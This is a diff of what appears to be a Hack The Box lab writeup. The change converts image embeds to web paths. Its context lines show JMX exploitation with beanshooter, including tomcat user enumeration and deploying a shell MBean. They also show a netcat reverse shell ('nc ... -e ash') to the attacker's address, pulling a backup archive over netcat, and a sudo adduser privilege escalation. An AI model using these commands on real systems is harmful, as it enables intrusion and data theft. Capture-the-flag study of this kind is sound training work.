@@ -59,8 +59,8 @@ https://github.com/qtc-de/beanshooter
 ```
 java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.129.234.57 2222  
 ```
-![[Pasted image 20251122200710.png]]
-![[Pasted image 20251122200725.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251122200710.png)
+![Image](/assets/img/htb-writeups/Pasted image 20251122200725.png)
 ```
 [+]     - Listing 2 tomcat users:
 [+]
@@ -81,13 +81,13 @@ Payload // No authentification:
 ```
 java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.129.234.57 2222 tonka
 ```
-![[Pasted image 20251122200833.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251122200833.png)
 
 Now we can trigger a shell:
 ```
 java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.129.234.57 2222
 ```
-![[Pasted image 20251122201639.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251122201639.png)
 OR
 ```
 java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard exec 'nc 10.10.14.97 1234 -e ash' 
@@ -100,7 +100,7 @@ nc -lvp 1234 > backup.tar.gz
 
 tar -xvzf backup.tar.gz
 ```
-![[Pasted image 20251122202241.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251122202241.png)
 
 
 Privesc:
@@ -114,4 +114,4 @@ User useradmin may run the following commands on manage:
 
 useradmin@manage:~$ sudo /usr/sbin/adduser admin
 ```
-![[Pasted image 20251122202955.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251122202955.png)
